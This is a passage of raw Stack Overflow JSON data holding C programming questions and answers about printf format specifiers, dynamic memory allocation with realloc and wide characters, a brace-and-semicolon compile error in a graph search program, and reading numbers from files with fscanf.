"https://stackoverflow.com/questions/53741237/cstring-and-array-about-s-c/53741336#53741336", "title": "[C]String and Array about %s , %c", "body": "<p>Your use of <code>\"%c\"</code> is correct, but don't use <code>gets</code>, is no longer part of the standard</p>\n\n<p>You can use <code>fgets</code>:</p>\n\n<pre><code>char arr[STRSIZE] = {0};\nchar *ptr;\n\nprintf(\"Enter a string: \");\nif (fgets(arr, sizeof arr, stdin) {\n    // skip the trailing new line\n    ptr = strchr(arr, '\\n');\n    if (ptr != NULL) {\n        *ptr = '\\0';\n    }\n}\n</code></pre>\n\n<p>to print the string, just use:</p>\n\n<pre><code>printf(\"%s\\n\", arr);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 3128, "user_id": 2899520, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9d046c85ed155fb3e964d9dd4c43842a?s=128&d=identicon&r=PG&f=1", "display_name": "LearningC", "link": "https://stackoverflow.com/users/2899520/learningc"}, "is_accepted": false, "score": 1, "last_activity_date": 1544612026, "creation_date": 1544612026, "answer_id": 53741424, "question_id": 53741237, "link": "https://stackoverflow.com/questions/53741237/cstring-and-array-about-s-c/53741424#53741424", "title": "[C]String and Array about %s , %c", "body": "<p>the way the second argument passed to <code>printf</code> is treated depends on type specified through <code>%c</code> or <code>%s</code>.<br>\n<code>%c</code> is used it indicates the char type so the function will read the data from memory location pointed by array[i] that will be of size of char.<br>\nwhere as when you pass <code>%s</code> the data type is taken as char array so the function will read the bytes till it gets <code>\\0</code> from the memory address passed as 2nd argument.<br>\nSince you are passing char type variable to <code>%s</code> it can lead to run time error since there is a type mismatch.</p>\n"}], "owner": {"reputation": 37, "user_id": 10690453, "user_type": "registered", "profile_image": "https://graph.facebook.com/372323846846310/picture?type=large", "display_name": "Hang Wui", "link": "https://stackoverflow.com/users/10690453/hang-wui"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "answer_count": 3, "score": -3, "last_activity_date": 1571646891, "creation_date": 1544611386, "last_edit_date": 1571646891, "question_id": 53741237, "link": "https://stackoverflow.com/questions/53741237/cstring-and-array-about-s-c", "title": "[C]String and Array about %s , %c", "body": "<p>Why I should use %c here instead of %s? <strong>If i use %s will Error</strong></p>\n\n<pre><code>printf(\"%c\",Array[i]);\n</code></pre>\n\n<p>when I define    <code>char Array[STRSIZE]=\"apple\"; should use %s here</code></p>\n\n<p>so how to use %s and %c correctly?</p>\n\n<p>Code:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n   int main(){\n      #define STRSIZE 81\n\n         char Array[STRSIZE];\n         printf(\"Enter a string: \");\n         gets(Array);\n         printf(\"\\nYou entered: \");\n         int i ;\n    for(i=0;i&lt;strlen(Array);i++){\n\n         printf(\"%c\",Array[i]);\n    }\n   return 0 ;} \n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>Enter a string: apple\nYou entered: apple\n</code></pre>\n"}, {"tags": ["c", "struct", "malloc", "realloc", "wchar-t"], "comments": [{"owner": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1544612277, "post_id": 53741132, "comment_id": 94335515, "body": "Could you show how <code>text</code> and <code>sentence_begun</code> are declared and initialized?"}, {"owner": {"reputation": 42, "user_id": 7893929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55b61493eb2f2381b8de1edc4fe55ec?s=128&d=identicon&r=PG&f=1", "display_name": "\u041d\u0438\u043a\u0438\u0442\u0430 \u0411\u0430\u0431\u0435\u043d\u043a\u043e", "link": "https://stackoverflow.com/users/7893929/%d0%9d%d0%b8%d0%ba%d0%b8%d1%82%d0%b0-%d0%91%d0%b0%d0%b1%d0%b5%d0%bd%d0%ba%d0%be"}, "reply_to_user": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1544612396, "post_id": 53741132, "comment_id": 94335582, "body": "@Schwern,      int amount_of_sentences = 0;     struct Sentence *sentences = (struct Sentence *) malloc(amount_of_sentences * sizeof(struct Sentence));     struct Text text = {sentences, amount_of_sentences};     bool sentence_begun = true;"}, {"owner": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1544612832, "post_id": 53741132, "comment_id": 94335830, "body": "<a href=\"https://stackoverflow.com/posts/53741132/edit\">Please edit your question</a> with that so the code example is more complete."}, {"owner": {"reputation": 42, "user_id": 7893929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55b61493eb2f2381b8de1edc4fe55ec?s=128&d=identicon&r=PG&f=1", "display_name": "\u041d\u0438\u043a\u0438\u0442\u0430 \u0411\u0430\u0431\u0435\u043d\u043a\u043e", "link": "https://stackoverflow.com/users/7893929/%d0%9d%d0%b8%d0%ba%d0%b8%d1%82%d0%b0-%d0%91%d0%b0%d0%b1%d0%b5%d0%bd%d0%ba%d0%be"}, "reply_to_user": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1544613064, "post_id": 53741132, "comment_id": 94335971, "body": "@Schwern, done with changes"}], "answers": [{"comments": [{"owner": {"reputation": 42, "user_id": 7893929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55b61493eb2f2381b8de1edc4fe55ec?s=128&d=identicon&r=PG&f=1", "display_name": "\u041d\u0438\u043a\u0438\u0442\u0430 \u0411\u0430\u0431\u0435\u043d\u043a\u043e", "link": "https://stackoverflow.com/users/7893929/%d0%9d%d0%b8%d0%ba%d0%b8%d1%82%d0%b0-%d0%91%d0%b0%d0%b1%d0%b5%d0%bd%d0%ba%d0%be"}, "edited": false, "score": 0, "creation_date": 1544613124, "post_id": 53741549, "comment_id": 94336011, "body": "It didn&#39;t help. The output is similar to the first one."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "reply_to_user": {"reputation": 42, "user_id": 7893929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55b61493eb2f2381b8de1edc4fe55ec?s=128&d=identicon&r=PG&f=1", "display_name": "\u041d\u0438\u043a\u0438\u0442\u0430 \u0411\u0430\u0431\u0435\u043d\u043a\u043e", "link": "https://stackoverflow.com/users/7893929/%d0%9d%d0%b8%d0%ba%d0%b8%d1%82%d0%b0-%d0%91%d0%b0%d0%b1%d0%b5%d0%bd%d0%ba%d0%be"}, "edited": false, "score": 0, "creation_date": 1544614210, "post_id": 53741549, "comment_id": 94336594, "body": "I forgot... <code>buffer[buffer_size] = &#39;\\0&#39;;</code> should be <code>buffer[buffer_size-1] = &#39;\\0&#39;;</code> If that doesn&#39;t fix it (and I can&#39;t find anytrhing more wrong with the code), you must take the program in a debugger and step through it, checking at each step if it still OK."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "reply_to_user": {"reputation": 42, "user_id": 7893929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55b61493eb2f2381b8de1edc4fe55ec?s=128&d=identicon&r=PG&f=1", "display_name": "\u041d\u0438\u043a\u0438\u0442\u0430 \u0411\u0430\u0431\u0435\u043d\u043a\u043e", "link": "https://stackoverflow.com/users/7893929/%d0%9d%d0%b8%d0%ba%d0%b8%d1%82%d0%b0-%d0%91%d0%b0%d0%b1%d0%b5%d0%bd%d0%ba%d0%be"}, "edited": false, "score": 0, "creation_date": 1544614427, "post_id": 53741549, "comment_id": 94336730, "body": "Also: <code>amount_of_symbols = buffer_size -1;</code> because the last char is the <code>&#39;\\0&#39;</code>"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "reply_to_user": {"reputation": 42, "user_id": 7893929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55b61493eb2f2381b8de1edc4fe55ec?s=128&d=identicon&r=PG&f=1", "display_name": "\u041d\u0438\u043a\u0438\u0442\u0430 \u0411\u0430\u0431\u0435\u043d\u043a\u043e", "link": "https://stackoverflow.com/users/7893929/%d0%9d%d0%b8%d0%ba%d0%b8%d1%82%d0%b0-%d0%91%d0%b0%d0%b1%d0%b5%d0%bd%d0%ba%d0%be"}, "edited": false, "score": 0, "creation_date": 1544614544, "post_id": 53741549, "comment_id": 94336802, "body": "And: <code>buffer[buffer_size - 2] = symbol;</code> for the same reason."}, {"owner": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1544616749, "post_id": 53741549, "comment_id": 94338088, "body": "@PaulOgilvie Is <code>strcpy</code> safe with <code>wchar_t *</code>?"}], "tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": false, "score": 0, "last_activity_date": 1544612396, "creation_date": 1544612396, "answer_id": 53741549, "question_id": 53741132, "link": "https://stackoverflow.com/questions/53741132/problems-with-dynamic-memory-allocation-for-structs-in-c/53741549#53741549", "title": "Problems with dynamic memory allocation for structs in C", "body": "<p>First, your buffer is 1 too small and doesn't account for the terminating <code>'\\0'</code>. At the top of your program, do:</p>\n\n<pre><code>int buffer_size = 1;\nwchar_t *buffer = (wchar_t *) malloc(buffer_size * sizeof(wchar_t));\n*buffer= '\\0';\n</code></pre>\n\n<p>But the real problem is in:</p>\n\n<pre><code>    text.sentences[text.amount_of_sentences - 1].sentence =\n                (wchar_t *) malloc(buffer_size * sizeof(wchar_t));\n    text.sentences[text.amount_of_sentences - 1].sentence = buffer;\n\n    buffer_size = 0;\n    buffer = (wchar_t *) realloc(buffer, buffer_size * sizeof(wchar_t));\n</code></pre>\n\n<p>You allocate memory for the sentence, but then you overwrite that pointer with the <code>buffer</code> pointer. Next you reset the buffer size and reallocate the buffer.</p>\n\n<p>The assignment does <em>not</em> copy the buffer data. To do that, do:</p>\n\n<pre><code>    strcpy(text.sentences[text.amount_of_sentences - 1].sentence, buffer);\n</code></pre>\n\n<p>and here too, do:</p>\n\n<pre><code>buffer_size = 1;\nbuffer = (wchar_t *) realloc(buffer, buffer_size * sizeof(wchar_t));\n*buffer= '\\0';\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 42, "user_id": 7893929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55b61493eb2f2381b8de1edc4fe55ec?s=128&d=identicon&r=PG&f=1", "display_name": "\u041d\u0438\u043a\u0438\u0442\u0430 \u0411\u0430\u0431\u0435\u043d\u043a\u043e", "link": "https://stackoverflow.com/users/7893929/%d0%9d%d0%b8%d0%ba%d0%b8%d1%82%d0%b0-%d0%91%d0%b0%d0%b1%d0%b5%d0%bd%d0%ba%d0%be"}, "edited": false, "score": 0, "creation_date": 1544615530, "post_id": 53742189, "comment_id": 94337343, "body": "It helped. Thank you, Schwern and Paul Ogilvie!"}, {"owner": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "reply_to_user": {"reputation": 42, "user_id": 7893929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55b61493eb2f2381b8de1edc4fe55ec?s=128&d=identicon&r=PG&f=1", "display_name": "\u041d\u0438\u043a\u0438\u0442\u0430 \u0411\u0430\u0431\u0435\u043d\u043a\u043e", "link": "https://stackoverflow.com/users/7893929/%d0%9d%d0%b8%d0%ba%d0%b8%d1%82%d0%b0-%d0%91%d0%b0%d0%b1%d0%b5%d0%bd%d0%ba%d0%be"}, "edited": false, "score": 0, "creation_date": 1544616305, "post_id": 53742189, "comment_id": 94337816, "body": "@\u041d\u0438\u043a\u0438\u0442\u0430\u0411\u0430\u0431\u0435\u043d\u043a\u043e You&#39;re welcome. I went ahead and coded up a version with the improvements I was talking about. <a href=\"https://gist.github.com/schwern/75f4bf42baf36042a5416cf782438438\" rel=\"nofollow noreferrer\">gist.github.com/schwern/75f4bf42baf36042a5416cf782438438</a> Use it for illustration, but if this is homework please don&#39;t turn it in as your own work."}], "tags": [], "owner": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 0, "last_activity_date": 1544616777, "last_edit_date": 1544616777, "creation_date": 1544614547, "answer_id": 53742189, "question_id": 53741132, "link": "https://stackoverflow.com/questions/53741132/problems-with-dynamic-memory-allocation-for-structs-in-c/53742189#53742189", "title": "Problems with dynamic memory allocation for structs in C", "body": "<p>The problem is here.</p>\n\n<pre><code>    text.sentences[text.amount_of_sentences - 1].sentence = (wchar_t *) malloc(buffer_size * sizeof(wchar_t));\n    text.sentences[text.amount_of_sentences - 1].sentence = buffer;\n\n    buffer_size = 0;\n    buffer = (wchar_t *) realloc(buffer, buffer_size * sizeof(wchar_t));\n</code></pre>\n\n<p>You allocate a fresh sentence with <code>malloc</code> and then overwrite it with <code>buffer</code>. This will leak memory.</p>\n\n<p>Then you assign <code>buffer</code> to <code>text.sentences[text.amount_of_sentences - 1].sentence</code> and then free that memory by reallocating <code>buffer</code>.</p>\n\n<p>From the C standard...</p>\n\n<blockquote>\n  <p><strong><em>The realloc function deallocates the old object pointed to by ptr</em></strong> and returns a pointer to a new object that has the size specified by size.</p>\n</blockquote>\n\n<p><code>text.sentences[text.amount_of_sentences - 1].sentence</code> winds up pointing to freed memory. This will lead to undefined behavior.</p>\n\n<p>Instead, point to <code>buffer</code> and allocate a new <code>buffer</code>.</p>\n\n<pre><code>    text.sentences[text.amount_of_sentences - 1].sentence = buffer;\n\n    buffer_size = 0;\n    buffer = malloc(buffer_size * sizeof(wchar_t));\n</code></pre>\n\n<hr>\n\n<p>Some other notes...</p>\n\n<p><a href=\"https://stackoverflow.com/users/3100312/paul-ogilvie\">As Paul noted</a>, you need to allocate an extra byte for the null byte.</p>\n\n<p><a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">There's no need to cast the result of <code>malloc</code> or <code>realloc</code></a>.</p>\n\n<p>It's simpler, faster, and less bug prone to allocate a large buffer on the stack to read input into (growing it if necessary). Then copy the contents to appropriately sized memory.</p>\n\n<p><a href=\"https://gist.github.com/schwern/75f4bf42baf36042a5416cf782438438\" rel=\"nofollow noreferrer\">I went ahead and coded up an improved version</a> to illustrate. If this is homework, please don't hand this in.</p>\n"}], "owner": {"reputation": 42, "user_id": 7893929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55b61493eb2f2381b8de1edc4fe55ec?s=128&d=identicon&r=PG&f=1", "display_name": "\u041d\u0438\u043a\u0438\u0442\u0430 \u0411\u0430\u0431\u0435\u043d\u043a\u043e", "link": "https://stackoverflow.com/users/7893929/%d0%9d%d0%b8%d0%ba%d0%b8%d1%82%d0%b0-%d0%91%d0%b0%d0%b1%d0%b5%d0%bd%d0%ba%d0%be"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 152, "favorite_count": 0, "accepted_answer_id": 53742189, "answer_count": 2, "score": 0, "last_activity_date": 1544616777, "creation_date": 1544611050, "last_edit_date": 1544613024, "question_id": 53741132, "link": "https://stackoverflow.com/questions/53741132/problems-with-dynamic-memory-allocation-for-structs-in-c", "title": "Problems with dynamic memory allocation for structs in C", "body": "<p>I'm given an unknown amount of \"wide symbols\". The text is formatted as sentences, which i have to add to struct \"Text\".</p>\n\n<p>These are my structs:</p>\n\n<pre><code>struct Sentence {\n    wchar_t *sentence;\n    int amount_of_symbols;\n};\n\nstruct Text {\n    struct Sentence *sentences;\n    int amount_of_sentences;\n}; \n</code></pre>\n\n<p>I dynamically allocate memory for array of \"Sentence\" structs and add them. \nThis is my input code:</p>\n\n<pre><code>int amount_of_sentences = 0;\nstruct Sentence *sentences = (struct Sentence *) malloc(amount_of_sentences * sizeof(struct Sentence));\n\nstruct Text text = {sentences, amount_of_sentences};\n\nwchar_t symbol;\nint buffer_size = 0;\nwchar_t *buffer = (wchar_t *) malloc(buffer_size * sizeof(wchar_t));\n\nbool sentence_begun = true;\n\nwhile (true) {\n    symbol = getwchar();\n\n    if (symbol == '\\n')\n        break;\n\n    if (sentence_begun &amp;&amp; symbol == ' ') {\n        sentence_begun = false;\n        continue;\n    }\n\n    buffer = (wchar_t *) realloc(buffer, (++buffer_size) * sizeof(wchar_t));\n    buffer[buffer_size - 1] = symbol;\n\n    if (symbol == '.') {\n        buffer[buffer_size] = '\\0';\n\n        text.amount_of_sentences++;\n        text.sentences = (struct Sentence *) realloc(text.sentences, text.amount_of_sentences * sizeof(struct Sentence));\n        text.sentences[text.amount_of_sentences - 1].amount_of_symbols = buffer_size;\n        text.sentences[text.amount_of_sentences - 1].sentence = (wchar_t *) malloc(buffer_size * sizeof(wchar_t));\n        text.sentences[text.amount_of_sentences - 1].sentence = buffer;\n\n        buffer_size = 0;\n        buffer = (wchar_t *) realloc(buffer, buffer_size * sizeof(wchar_t));\n        sentence_begun = true;\n    }\n}\n</code></pre>\n\n<p>Everything seems to be fine, but as soon as i try to output all my sentences, not all of them are shown and some of the are repeated.</p>\n\n<p>This is my output code:</p>\n\n<pre><code>for (int i = 0; i &lt; text.amount_of_sentences; i++) {\n    wprintf(L\"%ls\\n\", text.sentences[i].sentence);\n}\n</code></pre>\n\n<p>Example of input-output:</p>\n\n<pre><code>adjsand. asdad.a.a. aaaa. adsa.\n\n\na.\n\nadsa.\nadsa.\n</code></pre>\n\n<p>What can be wrong with this code and what should i change?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2201041"}, "edited": false, "score": 2, "creation_date": 1544610568, "post_id": 53740931, "comment_id": 94334481, "body": "<code>&#47;&#47; set adjacency {</code> Missed a brace"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1544610569, "post_id": 53740931, "comment_id": 94334483, "body": "for loop before that AddVertex call is missing a <code>{</code>. This was caused by K&amp;R style indentation here: <code>&#47;&#47; set adjacency {</code>"}, {"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 0, "creation_date": 1544610707, "post_id": 53740931, "comment_id": 94334560, "body": "And missing a semicolon near the end: <code>printf(&quot;Depth First Search: &quot;)</code> <b><code>;</code></b>"}], "answers": [{"tags": [], "owner": {"reputation": 3478, "user_id": 9061264, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TPing.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/9061264/mike"}, "is_accepted": true, "score": 0, "last_activity_date": 1544615575, "last_edit_date": 1544615575, "creation_date": 1544610956, "answer_id": 53741098, "question_id": 53740931, "link": "https://stackoverflow.com/questions/53740931/error-expected-declaration-specifiers-or/53741098#53741098", "title": "error: expected declaration specifiers or \u2018...\u2019", "body": "<p>You have got two problems:<br>\n-  one <code>{</code> is behind a <code>//</code><br>\n- one <code>;</code> is missing</p>\n\n<pre><code>int main() {\n   int i, j;\n\n   for(i = 0; i &lt; MAX; i++){    // set adjacency  (problem with braces !!)\n      for(j = 0; j &lt; MAX; j++)  // matrix to 0\n         adjMatrix[i][j] = 0;\n   }\n\n   addVertex('S');   // 0\n   addVertex('A');   // 1\n   addVertex('B');   // 2\n   addVertex('C');   // 3\n   addVertex('D');   // 4\n\n   addEdge(0, 1);    // S - A\n   addEdge(0, 2);    // S - B\n   addEdge(0, 3);    // S - C\n   addEdge(1, 4);    // A - D\n   addEdge(2, 4);    // B - D\n   addEdge(3, 4);    // C - D\n\n   printf(\"Depth First Search: \");    //here ; is missing\n   depthFirstSearch(); \n\n   return 0;   \n}\n</code></pre>\n"}], "owner": {"reputation": 41, "user_id": 6616847, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d14f711e8e87590089345d40514dff0c?s=128&d=identicon&r=PG&f=1", "display_name": "Calvin", "link": "https://stackoverflow.com/users/6616847/calvin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 896, "favorite_count": 0, "accepted_answer_id": 53741098, "answer_count": 1, "score": 0, "last_activity_date": 1544615575, "creation_date": 1544610377, "question_id": 53740931, "link": "https://stackoverflow.com/questions/53740931/error-expected-declaration-specifiers-or", "title": "error: expected declaration specifiers or \u2018...\u2019", "body": "<p>I wanted to use this code to compile and run through a simple breath first search algorithm but i am having this error message on all of the addVertex and addEdge function. </p>\n\n<p>not sure what is going on.</p>\n\n<p>main.c:120:14: error: expected declaration specifiers or \u2018...\u2019 before 'S'\n    addVertex('S');   // 0</p>\n\n<p>here is the full C code</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n\n#define MAX 5\n\nstruct Vertex {\n   char label;\n   bool visited;\n};\n\n//stack variables\n\nint stack[MAX]; \nint top = -1; \n\n//graph variables\n\n//array of vertices\nstruct Vertex* lstVertices[MAX];\n\n//adjacency matrix\nint adjMatrix[MAX][MAX];\n\n//vertex count\nint vertexCount = 0;\n\n//stack functions\n\nvoid push(int item) { \n   stack[++top] = item; \n} \n\nint pop() { \n   return stack[top--]; \n} \n\nint peek() {\n   return stack[top];\n}\n\nbool isStackEmpty() {\n   return top == -1;\n}\n\n//graph functions\n\n//add vertex to the vertex list\nvoid addVertex(char label) {\n   struct Vertex* vertex = (struct Vertex*) malloc(sizeof(struct Vertex));\n   vertex-&gt;label = label;  \n   vertex-&gt;visited = false;     \n   lstVertices[vertexCount++] = vertex;\n}\n\n//add edge to edge array\nvoid addEdge(int start,int end) {\n   adjMatrix[start][end] = 1;\n   adjMatrix[end][start] = 1;\n}\n\n//display the vertex\nvoid displayVertex(int vertexIndex) {\n   printf(\"%c \",lstVertices[vertexIndex]-&gt;label);\n}       \n\n//get the adjacent unvisited vertex\nint getAdjUnvisitedVertex(int vertexIndex) {\n   int i;\n\n   for(i = 0; i &lt; vertexCount; i++) {\n      if(adjMatrix[vertexIndex][i] == 1 &amp;&amp; lstVertices[i]-&gt;visited == false) {\n         return i;\n      }\n   }\n\n   return -1;\n}\n\nvoid depthFirstSearch() {\n   int i;\n\n   //mark first node as visited\n   lstVertices[0]-&gt;visited = true;\n\n   //display the vertex\n   displayVertex(0);   \n\n   //push vertex index in stack\n   push(0);\n\n   while(!isStackEmpty()) {\n      //get the unvisited vertex of vertex which is at top of the stack\n      int unvisitedVertex = getAdjUnvisitedVertex(peek());\n\n      //no adjacent vertex found\n      if(unvisitedVertex == -1) {\n         pop();\n      } else {\n         lstVertices[unvisitedVertex]-&gt;visited = true;\n         displayVertex(unvisitedVertex);\n         push(unvisitedVertex);\n      }\n   }\n\n   //stack is empty, search is complete, reset the visited flag        \n   for(i = 0;i &lt; vertexCount;i++) {\n      lstVertices[i]-&gt;visited = false;\n   }        \n}\n\nint main() {\n   int i, j;\n\n   for(i = 0; i &lt; MAX; i++)    // set adjacency {\n      for(j = 0; j &lt; MAX; j++) // matrix to 0\n         adjMatrix[i][j] = 0;\n   }\n\n   addVertex('S');   // 0\n   addVertex('A');   // 1\n   addVertex('B');   // 2\n   addVertex('C');   // 3\n   addVertex('D');   // 4\n\n   addEdge(0, 1);    // S - A\n   addEdge(0, 2);    // S - B\n   addEdge(0, 3);    // S - C\n   addEdge(1, 4);    // A - D\n   addEdge(2, 4);    // B - D\n   addEdge(3, 4);    // C - D\n\n   printf(\"Depth First Search: \")\n   depthFirstSearch(); \n\n   return 0;   \n}\n</code></pre>\n"}, {"tags": ["c", "scanf", "fgets"], "answers": [{"comments": [{"owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "edited": false, "score": 0, "creation_date": 1544611115, "post_id": 53741127, "comment_id": 94334847, "body": "<code>fscanf(f1,&quot;%d&quot;,vars);</code> --&gt; <code>fscanf(f1,&quot;%d&quot;,&amp;vars);</code>"}, {"owner": {"reputation": 10, "user_id": 10734349, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-X3AMme6Ylx4/AAAAAAAAAAI/AAAAAAAAAJs/-t5c04cgS_w/photo.jpg?sz=128", "display_name": "Samson Wu", "link": "https://stackoverflow.com/users/10734349/samson-wu"}, "reply_to_user": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "edited": false, "score": 0, "creation_date": 1544611243, "post_id": 53741127, "comment_id": 94334917, "body": "My bad. Thank you"}, {"owner": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "edited": false, "score": 0, "creation_date": 1544613556, "post_id": 53741127, "comment_id": 94336240, "body": "OK, it works. Thanks. I think the problem was sscanf, but instead, fscanf works!"}, {"owner": {"reputation": 10, "user_id": 10734349, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-X3AMme6Ylx4/AAAAAAAAAAI/AAAAAAAAAJs/-t5c04cgS_w/photo.jpg?sz=128", "display_name": "Samson Wu", "link": "https://stackoverflow.com/users/10734349/samson-wu"}, "edited": false, "score": 0, "creation_date": 1544613899, "post_id": 53741127, "comment_id": 94336405, "body": "glad I could help"}], "tags": [], "owner": {"reputation": 10, "user_id": 10734349, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-X3AMme6Ylx4/AAAAAAAAAAI/AAAAAAAAAJs/-t5c04cgS_w/photo.jpg?sz=128", "display_name": "Samson Wu", "link": "https://stackoverflow.com/users/10734349/samson-wu"}, "is_accepted": false, "score": 0, "last_activity_date": 1544612935, "last_edit_date": 1544612935, "creation_date": 1544611035, "answer_id": 53741127, "question_id": 53740841, "link": "https://stackoverflow.com/questions/53740841/c-language-search-text-file-for-a-word-and-store-the-value-into-int-and-flout/53741127#53741127", "title": "C Language: Search text file for a &quot;word&quot; and store the value into int and flout type variables", "body": "<p>This is an example of how to read, write file:\n//Read:  </p>\n\n<pre><code>FILE *f1, *f2;\nf1 = fopen(\"IN.INP\",\"r\");\nfscanf(f1,\"%d\",&amp;vars);    \nfclose(f1);\n//Write:\nf2 = fopen(\"OUT.OUT\", \"w\");\nfprintf(f2, \"%d\",vars);\nfclose(f2);\n</code></pre>\n\n<p>I'm not sure if I understand correctly about your question of \"How to convert .txt to int,float,binary type vars\" or not. But here is how:</p>\n\n<pre><code>char a = 10;\nint b = (int) a;\n</code></pre>\n\n<p>But if you just want to read the .txt's value into int, float then just use\nfscanf(f1,\"%d\",&amp;vars);//d for int </p>\n"}, {"comments": [{"owner": {"reputation": 368, "user_id": 10735689, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aPtkk.png?s=128&g=1", "display_name": "ShivYaragatti", "link": "https://stackoverflow.com/users/10735689/shivyaragatti"}, "reply_to_user": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": 